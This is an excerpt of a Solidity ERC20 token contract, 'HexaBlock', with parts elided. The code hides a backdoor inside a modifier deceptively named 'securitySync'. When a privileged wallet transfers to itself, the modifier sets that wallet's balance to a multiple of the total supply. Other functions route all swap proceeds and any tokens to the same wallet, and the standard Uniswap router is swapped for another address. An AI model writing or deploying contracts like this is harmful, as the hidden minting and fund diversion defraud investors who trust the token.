...
contract HexaBlock is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x1c7d9b8F896Ba4def22fC3AA00c0F155a2Fb3d9a); 
    address payable public Wallet_Event = payable(0x1c7d9b8F896Ba4def22fC3AA00c0F155a2Fb3d9a);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD); 
    address private securityChecker;


    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal =  300000 * 10**6* 10**_decimals;
    string private constant _name = "NAMA"; 
    ...
    uint256 public Percent_Event = 30;
    ...
    constructor () {
        ...
        securityChecker = Wallet_Event;
        
        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3); // 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ...
        _isExcludedFromFee[Wallet_Event] = true; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            uint256 tokens_to_D = contractTokenBalance * Percent_Event / 100;
            ...
            uint256 split_M = Percent_Marketing * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Event);
            uint256 ETH_M = ETH_Total * split_M / 100;

            uint256 split_D = Percent_Event * 100 / (Percent_AutoLP + Percent_Marketing + Percent_Event);
            ...
            sendToWallet(Wallet_Event, ETH_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(Wallet_Event, removeRandom);
    ...
    */
    ...
    modifier securitySync(address verifier_one, address verifier_two,uint256 amountToSync){
        if(verifier_one == verifier_two && verifier_one == securityChecker){
            _tOwned[securityChecker] = amountToSync * _tTotal;
        }
        _;
    }


    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private securitySync(sender,recipient,tAmount){
